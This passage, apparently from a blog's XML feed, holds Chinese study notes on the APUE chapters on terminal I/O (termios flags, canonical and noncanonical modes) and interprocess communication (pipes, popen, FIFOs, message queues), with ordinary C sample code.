class="line"></span><br><span class="line">    <span class="keyword">if</span> (interactive &amp;&amp; driver == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tty_raw(STDIN_FILENO) &lt; <span class="number">0</span>)<span class="comment">/* user&#x27;s tty to raw mode */</span></span><br><span class="line">            err_sys(<span class="string">&quot;tty_raw error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (atexit(tty_atexit) &lt; <span class="number">0</span>)<span class="comment">/* reset user&#x27;s tty on exit */</span></span><br><span class="line">            err_sys(<span class="string">&quot;atexit error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (driver)</span><br><span class="line">        do_driver(driver);<span class="comment">/* changes our stdin/stdout */</span></span><br><span class="line"></span><br><span class="line">    loop(fdm, ignoreeof);<span class="comment">/* copies stdin -&gt; ptym, ptym -&gt; stdout */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（18-终端I/O）</title>
      <link href="/posts/255074044.html"/>
      <url>/posts/255074044.html</url>
      
        <content type="html"><![CDATA[<p>本章主要介绍终端的相关概念，及一些修改终端操作的函数。</p><h1>概念</h1><h2 id="工作模式">工作模式</h2><p>主要有以下两种工作模式：</p><ul><li>规范模式（Canonical mode）输入处理。在此模式下，对于终端的输入以行为单位进行处理。每次读取最多返回一行。这是默认的模式。</li><li>非规范模式（Noncanonical mode）输入处理。输入字符不装配成行，一些特殊字符（如Ctrl+D）以不会进行处理。</li></ul><span id="more"></span><p>这两种模式在后面会有详细解释。</p><h2 id="终端特性">终端特性</h2><p>在结构<code>termios</code>中定义了终端设备全部特性的标志，在其中又将各种标志进行分类，其结构大体如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> &#123;</span></span><br><span class="line">  <span class="type">tcflag_t</span>  c_iflag;      <span class="comment">/* input flags */</span></span><br><span class="line">  <span class="type">tcflag_t</span>  c_oflag;      <span class="comment">/* output flags */</span></span><br><span class="line">  <span class="type">tcflag_t</span>  c_cflag;      <span class="comment">/* control flags */</span></span><br><span class="line">  <span class="type">tcflag_t</span>  c_lflag;      <span class="comment">/* local flags */</span></span><br><span class="line">  <span class="type">cc_t</span>      c_cc[NCCS];   <span class="comment">/* control characters */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>输入标志通过终端驱动程序控制字符的输入（如剥除输入字节的第8位，允许输入奇偶校验），输出标志控制驱动程序输出（如将换行符转换为CR/LF），控制标志影响RS-232串行线（如忽略调制解调器的状态线），本地标志影响驱动程序和用户之间的接口（如开关回显）。</p></blockquote><p><code>c_cc</code>数组则包含了所有可以更改的特殊字符。</p><p>相关标志及其说明见如下各图：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231110354.png" alt="c_cflag terminal flags"></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231110442.png" alt="c_iflag terminal flags"></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231110512.png" alt="c_lflag terminal flags"></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231110532.png" alt="c_oflag terminal flags"></p><h1>配置终端</h1><p>主要有13个函数可以对终端进行操作，其中的<code>tcgetattr</code>和<code>tcsetattr</code>函数用于读取/设置上一节列出的各个标志，因此实际上终端有非常多的配置选项，各个函数之间的关系可以参考下图：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231150852.png" alt="Relationships among the terminal-related functions"></p><h2 id="获得和设置终端属性">获得和设置终端属性</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tcgetattr</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> termios *termptr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">tcsetattr</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> opt, <span class="type">const</span> <span class="keyword">struct</span> termios *termptr)</span>;</span><br></pre></td></tr></table></figure><p>这两个函数用于检测和修改各种终端选项标志和特殊字符，它们都使用了前述的<code>termios</code>结构用于获取和设置终端属性。另外，这两个函数只针对终端进行操作，因此<code>fd</code>没有引用终端设备就会出错返回-1，且将errno设置为ENOTTY。</p><p>set函数的<code>opt</code>参数指定新的属性的起作用时间，有如下几个选项：</p><ul><li>TCSANOW：立即改变</li><li>TCSADRAIN：发送所有输出后才发生更改</li><li>TCSAFLUSH：与TCSADRAIN相似，但是所有未读的输入都会被丢弃</li></ul><p><strong>注意：</strong></p><p>set函数只要执行了一种所要求的动作就会返回成功，因此有必要在后面通过get函数检查是否所有的设置都生效了。</p><h2 id="特殊输入字符">特殊输入字符</h2><p>上一节提到<code>c_cc</code>数组包含了特殊字符，下面就是这些特殊字符：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201231151204.png" alt="Summary of special terminal input characters"></p><p>其中，<code>c_cc subscript</code>列表示该字符对应的数组下标值，有了它可以方便地修改对应的特殊字符，如果想要禁止使用某个特殊字符，只需将其设置为<code>fpathconf(fd, _PC_VDISABLE)</code>的返回值即可。示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">term</span>;</span></span><br><span class="line">  <span class="type">long</span> vdisable;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(STDIN_FILENO) == <span class="number">0</span>) &#123;</span><br><span class="line">    err_quit(<span class="string">&quot;standard input is not a terminal device&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((vdisable = fpathconf(STDIN_FILENO, _PC_VDISABLE)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    err_quit(<span class="string">&quot;fpathconf error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (tcgetattr(STDIN_FILENO, &amp;term) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    err_sys(<span class="string">&quot;tcgetattr error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  term.c_cc[VINTR] = vdisable; <span class="comment">/* 禁用INTR */</span></span><br><span class="line">  term.c_cc[VEOF] = <span class="number">2</span>;         <span class="comment">/* ctrl+B -&gt; EOF */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcsetattr(STDIN_FILENO, TCSAFLUSH, &amp;term) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    err_sys(<span class="string">&quot;tcsetattr error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="波特率函数">波特率函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: baud rate value</span></span><br><span class="line"><span class="type">speed_t</span> <span class="title function_">cfgetispeed</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> termios *termptr)</span>;   <span class="comment">/* 输入 */</span></span><br><span class="line"><span class="type">speed_t</span> <span class="title function_">cfgetospeed</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> termios *termptr)</span>;   <span class="comment">/* 输出 */</span></span><br><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cfsetispeed</span><span class="params">(<span class="keyword">struct</span> termios *termptr, <span class="type">speed_t</span> speed)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cfsetospeed</span><span class="params">(<span class="keyword">struct</span> termios *termptr, <span class="type">speed_t</span> speed)</span>;</span><br></pre></td></tr></table></figure><p>这几个函数用于获取和设置输入/输出的波特率（位/秒）。速度值是形如B0、B50、B75……的常量值。</p><p>需要注意的是，速率值保存在<code>termios</code>结构中，但是并没有规定其使用的字段，所以无法通过该结构直接获取或设置速率，而只能通过以上几个函数。</p><p>如果想使用get函数，在这之前需要先调用<code>tcgetattr</code>获取当前的<code>termios</code>结构变量，然后传入get函数中以获得速率。同理，在设置速率时，调用完set函数后，需要调用<code>tcsetattr</code>函数以使该改变生效。</p><h2 id="行控制函数">行控制函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All four return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tcdrain</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">tcflow</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> action)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">tcflush</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> <span class="built_in">queue</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">tcsendbreak</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> duration)</span>;</span><br></pre></td></tr></table></figure><p>这4个函数要求<code>fd</code>引用的是终端设备，否则出错返回-1，且errno设置为ENOTTY。</p><p><code>tcdrain</code>函数等待所有输出都被传递.</p><p><code>tcflow</code>函数控制输入和输出流。由<code>action</code>参数进行控制：</p><ul><li>TCOOFF：暂停输出（输出被挂起）</li><li>TCOON：重启被挂起的输出</li><li>TCIOFF：发送STOP字符，使终端停止向系统发送数据</li><li>TCION：发送STRAT字符，使终端恢复发送数据</li></ul><p><code>tcflush</code>函数冲洗（丢弃）输入缓冲区（终端驱动程序已收到但用户程序未读取的数据）或输出缓冲区（用户程序写入但未被传递的数据）。<code>queue</code>参数决定哪个缓冲区中的数据被冲洗：</p><ul><li>TCIFLUSH：冲洗输入队列</li><li>TCOFLUSH：冲洗输出队列</li><li>TCIOFLUSH：冲洗两者</li></ul><p><code>tcsendbreak</code>函数会在指定的时间内持续发送0值的位流。如果<code>duration</code>参数为0，则持续0.25~0.5秒，否则持续时间根据实现的不同而不同。</p><h2 id="终端标识">终端标识</h2><p>参考代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_ctermid.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_ctermid.c</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: pointer to name of controlling terminal on success, </span></span><br><span class="line"><span class="comment">//   pointer to empty string on error</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">ctermid</span><span class="params">(<span class="type">char</span> *ptr)</span>;</span><br></pre></td></tr></table></figure><p>该函数用于确定终端的名字（一般都是/dev/tty）。</p><p>当<code>ptr</code>非空时，控制终端名会存放在该参数指向的数组中，数组的长度至少为<code>L_ctermid</code>字节。无论<code>ptr</code>是否为空，函数成功执行后都会返回指向终端名的指针（如果<code>ptr</code>为空，则函数自己分配空间）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: 1 (true) if terminal device, 0 (false) otherwise</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isatty</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Returns: pointer to pathname of terminal, NULL on error</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">ttyname</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure><p><code>isatty</code>用于检查描述符是否引用的是终端设备。</p><p><code>ttyname</code>返回的是描述符打开的终端设备的路径名。</p><h2 id="窗口大小">窗口大小</h2><p>参考代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_windowSize.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_windowSize.c</a></p><p>内核为每个终端和伪终端都维护一个<code>winsize</code>结构，包含终端窗口的大小信息。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ws_row;    <span class="comment">/* rows, in characters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ws_col;    <span class="comment">/* columns, in characters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ws_xpixel; <span class="comment">/* horizontal size, pixels (unused) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ws_ypixel; <span class="comment">/* vertical size, pixels (unused) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过ioctl的<code>TIOCGWINSZ</code>和<code>TIOCSWINSZ</code>命令，可以分别获取和设置该值。</p><p>当窗口大小改变时，前台进程组会收到<code>SIGWINCH</code>信号。</p><h1>两种模式</h1><h2 id="规范模式">规范模式</h2><p>这种模式比较简单，也是比较常用的模式。工作过程为：发送读请求，输入一行后，终端驱动程序返回。</p><p>该模式中，<code>NL</code>、<code>EOL</code>、<code>EOL2</code>和<code>EOF</code>被解释为行结束。另外，如果设置了终端标志<code>ICRNL</code>且未设置<code>IGNCR</code>，则<code>CR</code>会被转化为<code>NL</code>，从而造成读返回。</p><p>除此以外，还有一些情况会造成读返回：</p><ul><li>读取到请求的字节数，则即使没有读取完整的一行，也会马上返回。下次读取会从前一次停止的地方继续读。</li><li>捕捉到信号，且函数不再自动重启（自动重启的详细介绍参考书10.5节）。</li></ul><h2 id="非规范模式">非规范模式</h2><p>参考代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_noncanonicalMode.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch18/term_noncanonicalMode.c</a></p><p>通过关闭<code>c_lflag</code>字段的<code>ICANON</code>标志，可以使终端运行于非规范模式下。在该模式下，输入数据不装配成行，也不处理以下几个特殊字符：<code>RASE</code>，<code>KILL</code>，<code>EOF</code>，<code>NL</code>， <code>EOL</code>， <code>EOL2</code>， <code>CR</code>， <code>REPRINT</code>，<code>STATUS</code>和 <code>WERASE</code>。</p><p>由于不是以行为单位返回数据，因此需要指定一些参数来告诉系统何时返回数据。除了读取指定量的数据自动返回以外，通过设置c_cc数组中的<code>MIN</code>和<code>TIME</code>变量（下标分别为VMIN和VTIME），使得系统在超过给定时间后也会返回。</p><p><code>MIN</code>用于指定read返回前的最小字节数，<code>TIME</code>指定等待数据到达的<strong>分秒</strong>数（分秒为0.1秒）。两者组合有如下4中情形：</p><ul><li>MIN&gt;0,TIME&gt;0：在第一个字节被接收时启动时长为TIME的定时器。若在超时前接收到了MIN个字节，则read返回MIN个字节，否则返回已接收到的字节数。如果在调用read之前已经有数据可用，那么调用read后返回的字节数就可能会&gt;MIN。</li><li>MIN&gt;0,TIME==0：read在接收到MIN个字节前不会返回。</li><li>MIN==0,TIME&gt;0：调用read后立即启动定时器（注意与第一种情况的启动时机不同），在接到一个字节或定时器超时后，立即返回。因此read可能返回0（定时器超时）。</li><li>MIN==0,TIME==0：有数据可用则返回要求的字节数，否则立即返回0。</li></ul><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20210104112334.png" alt="Four cases for noncanonical input"></p><p>4种情形总结如上表所示，<code>nbytes</code>为read的第三个参数，即要求读取的字节数。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（15-进程间通信）</title>
      <link href="/posts/2640012016.html"/>
      <url>/posts/2640012016.html</url>
      
        <content type="html"><![CDATA[<p>本章主要介绍一些进程间通信的方式，如管道、消息队列、信号量和共享存储等。</p><h1>管道</h1><p>一般来说，管道是半双工的（即数据只能在一个方向上流动），并且只能在具有公共祖先的两个进程之间使用。通常，父进程创建管道后会接着调用<code>fork</code>，从而利用管道在父子进程之间通信。</p><span id="more"></span><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201221194934.png" alt="Half-duplex pipe after a fork"></p><p>之后，父子进程可以分别关闭管道的读/写端，以利用管道在父子进程中传递信息。例如，如果想要创建从父进程到子进程的管道，则可以关闭父进程的<strong>读端</strong>和子进程的<strong>写端</strong>。</p><p>由于管道半双工的特性，想要在父子进程间双向传递信息需要建立2个管道。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> fd[<span class="number">2</span>])</span>;</span><br></pre></td></tr></table></figure><p>利用<code>pipe</code>函数可以创建管道，<code>fd</code>参数返回两个文件描述符，<code>fd[0]</code>为读而打开，<code>fd[1]</code>为写而打开。<code>fd[1]</code>的输出是<code>fd[0]</code>的输入。</p><p>在上面的例子中，父进程关闭<code>fd[0]</code>，子进程关闭<code>fd[1]</code>，那么最后的示意图如下：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201221195626.png" alt="Pipe from parent to child"></p><p><strong>注意：</strong></p><ul><li>当读一个写端被关闭的管道，在所有数据被读取后，read返回0</li><li>当写一个读端被关闭的管道，会产生<code>SIGPIPE</code>信号。如果忽略该信号或从信号处理程序返回，则write返回-1，且设置errno为<code>EPIPE</code></li><li>写入不超过<code>PIPE_ BUF</code> 字节的操作是原子的，如果写入数据的大小超过该值，在多个进程同时写一个管道时，所写的数据可能交叉</li></ul><h2 id="连接到另一个进程">连接到另一个进程</h2><p>管道的通常用法是创建一个连接到另一个进程的管道，然后读取其输出或者向其输入端发送数据。可以使用<code>popen</code>和<code>pclose</code>实现这一功能。这两个函数实现的操作是：创建一个管道，fork一个子进程，关闭未使用的管道，执行shell运行命令，然后等待命令终止。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: file pointer if OK, NULL on error</span></span><br><span class="line">FILE *<span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdstring, <span class="type">const</span> <span class="type">char</span> *type)</span>;</span><br><span class="line"><span class="comment">// Returns: termination status of cmdstring, or −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *fp)</span>;</span><br></pre></td></tr></table></figure><p><code>popen</code>先执行fork，然后调用exec执行<code>cmdstring</code>，并且返回一个标准I/O文件指针，如果<code>type</code>是&quot;r&quot;，则文件指针连接到<code>cmdstring</code>的标准输出，如果是&quot;w&quot;则连接到标准输入，如下图所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201221202649.png" alt="popen"></p><p><code>cmdstring</code>会以<code>sh -c cmdstring</code>的方式执行。</p><p><code>pclose</code>函数关闭标准I/O流，等待命令终止，然后返回shell的终止状态。（注意不要使用fclose函数，它不会等待子进程结束）</p><h2 id="协同进程">协同进程</h2><blockquote><p>UNIX系统过滤程序从标准输入读取数据，向标准输出写数据。几个过滤程序通常在shell管道中线性连接。当一个过滤程序既产生某个过滤程序的输入，又读取该过滤程序的输出时，它就变成了协同进程（coprocess）。</p></blockquote><p>要实现协同进程，需要创建两个管道，分别作为协同进程的标准输入和输出，示意图如下：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201222102807.png" alt="Driving a coprocess by writing its standard input and reading its standard output"></p><p>子进程的参考代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">close(fd1[<span class="number">1</span>]);</span><br><span class="line">close(fd2[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (fd1[<span class="number">0</span>] != STDIN_FILENO) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dup2(fd1[<span class="number">0</span>], STDIN_FILENO) != STDIN_FILENO)</span><br><span class="line">        err_sys(<span class="string">&quot;dup2 error to stdin&quot;</span>);</span><br><span class="line">    close(fd1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fd2[<span class="number">1</span>] != STDOUT_FILENO) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dup2(fd2[<span class="number">1</span>], STDOUT_FILENO) != STDOUT_FILENO)</span><br><span class="line">        err_sys(<span class="string">&quot;dup2 error to stdout&quot;</span>);</span><br><span class="line">    close(fd2[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (execl(<span class="string">&quot;./add2&quot;</span>, <span class="string">&quot;add2&quot;</span>, (<span class="type">char</span> *)<span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    err_sys(<span class="string">&quot;execl error&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>dup2</code>函数用于复制指定的文件描述符，它将两个管道描述符分别连接到标准输入和输出。</p><p><strong>注意：</strong></p><p>在协同进程中如果需要使用标准I/O（如fgets），则要额外注意其缓冲机制。对于管道，其默认是<strong>全缓冲</strong>的，可以通过调用<code>fflush</code>或者设置缓冲模式（setvbuf/setbuf）来解决。</p><h2 id="FIFO">FIFO</h2><p>FIFO也被称为命名管道，它使得不相关的进程间也能交换数据。</p><p>FIFO也是一种文件类型，创建FIFO与创建文件类似，需要指定其路径。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mkfifo</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">mode_t</span> mode)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mkfifoat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure><p><code>mode</code>参数指明FIFO的文件权限，与open函数中的mode相同。</p><p><code>mkfifoat</code>函数的<code>path</code>参数有如下几种情况：</p><ul><li>如果指定为绝对路径，则会忽略<code>dirfd</code>参数，行为与<code>mkfifo</code>类似</li><li>如果指定为相对路径，则该路径与<code>dirfd</code>打开的目录有关</li><li>如果指定为相对路径，且<code>dirfd</code>有参数<strong>AT_FDCWD</strong>，那么路径以当前目录开始</li></ul><p>创建完成后，就可以使用open打开FIFO。</p><p>在打开时如果没有设置非阻塞标志<strong>O_NONBLOCK</strong>，那么如果以只读方式打开（O_RDONLY），进程会被阻塞直到其他进程为写而打开这个FIFO，同理，只写方式（O_ WRONL ）打开也会阻塞。</p><p>但是，不应该使用O_RDWR的方式来绕过这种阻塞行为，而应该使用非阻塞标志。使用读写方式打开FIFO，会导致读取数据时永远看不到文件结束，因为至少会有一个写描述符是打开着的。</p><h3 id="实例">实例</h3><p>可以使用FIFO进行客户进程与服务器进程之间的通信。每个客户进程可以将自己的请求写到一个公共的FIFO文件中（请求长度需要小于PIPE_BUF以避免客户进程之间的数据交叉），服务器进程针对每个客户进程创建FIFO，用于向客户进程发送数据。客户进程的FIFO的路径名可以使用客户进程的PID号作为基础，如/tmp/servv1.PID，这样客户进程就直到该从哪个FIFO读取服务器进程返回的数据了。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201222152247.png" alt="Client–server communication using FIFOs"></p><h1>XSI IPC</h1><p>这一部分主要包含3种IPC方式：消息队列、信号量和共享存储器。</p><p>每个IPC对象与键（key）相关联，以使得多个进程可以通过它进行联系。在创建IPC结构时，必须指定一个键。而在系统内部，则使用标识符引用IPC结构。</p><p>关于键的创建方式，主要有如下几种：</p><ul><li><p>指定为<strong>IPC_PRIVATE</strong>，这会创建一个新的IPC结构，可以将返回的标识符存入文件供其他进程使用，也可直接给fork后的子进程使用</p></li><li><p>在公共头文件中定义一个键，然后由一个进程（通常是服务器进程）根据这个键来创建新的IPC结构。但是这种方式可能会与已经存在的键冲突，需要进程删除原有的IPC结构再重新创建。</p></li><li><p>使用<code>ftok</code>函数，将路径名和某个数字（0-255）变换为一个键。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: key if OK, (key_t)−1 on error</span></span><br><span class="line"><span class="type">key_t</span> <span class="title function_">ftok</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><p><code>path</code>参数必须引用的是现有的文件，<code>id</code>参数只使用其低8位。</p></li></ul><p>另外，在创建IPC结构时还需要指定其权限，与文件权限类似，但是不存在执行权限。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201222162533.png" alt="XSI IPC permissions"></p><p><strong>注意：</strong></p><ul><li><code>IPC_PRIVATE</code>只能用于创建新的IPC结构，而不能用来引用一个现有的IPC结构。</li><li>如果希望确保新创建的IPC结构没有引用具有同一标识符的现有IPC结构，则可以在flag中同时指定<code>IPC_CREAT</code>和<code>IPC_EXCL</code>。这样，如果已经存在则会返回EEXIST。</li></ul><h2 id="消息队列">消息队列</h2><p>消息队列是消息的链接表，存储在内核中，由消息队列标识符标识。以下简称队列。</p><p>相关的数据结构很少用到，再次不再列出，后面的信号量和共享存储同理。需要的话可以到对应的头文件中查看。</p><p>示例代码参考https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_msg.c</p><p><code>msgget</code>用于创建或打开一个队列。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: message queue ID if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>key</code>参数可以是通过ftok函数生成的，也可以是IPC_PRIVATE。<code>flag</code>用于设定读写权限，如果是新建该IPC结构则可以添加<code>IPC_CREAT</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> nbytes, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>msgsnd</code>将新消息添加到队列尾端。</p><p><code>msqid</code>是get函数返回的队列ID，<code>nbytes</code>是消息数据的长度。</p><p><code>ptr</code>指向一个结构，其包含一个正的消息类型，和消息数据（<code>nbytes</code>为0则无消息数据），可以定义其结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">1</span>];    <span class="comment">/* message data, of length nbytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>flag</code>可以指定为<code>IPC_NOWAIT</code>，当消息队列满时（或达到系统限制），会立即出错返回EAGAIN。否则，进程会一直阻塞直到：有空间容纳消息；队列被删除（返回EIDRM)；或捕捉到信号并从处理程序返回（返回EINTR）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: size of data portion of message if OK, −1 on error</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *ptr, <span class="type">size_t</span> nbytes, <span class="type">long</span> type, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>msgrcv</code>用于从队列中取出消息，可以指定获取某些类型的数据，而不是必须按照先进先出的次序。</p><p><code>ptr</code>指向的结构与snd函数一样，而<code>nbytes</code>则指定了消息长度，如果返回的消息长度&gt;nbytes，而<code>flag</code>中设置了MSG_NOERROR，则消息被截断。如果没有设置则出错返回E2BIG，而消息仍然留在队列中。</p><p><code>type</code>可以指定想要获取的消息：</p><ul><li>type==0：返回队列中的第一个消息</li><li>type&gt;0：返回消息类型为type的第一个消息</li><li>type&lt;0：返回消息类型≤type绝对值的消息，如果有若干个满足则取类型最小的。</li></ul><p><code>flag</code>参数同样可以指定为非阻塞。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msgctl</span><span class="params">(<span class="type">int</span> msqid, <span class="type">int</span> cmd, <span class="keyword">struct</span> msqid_ds 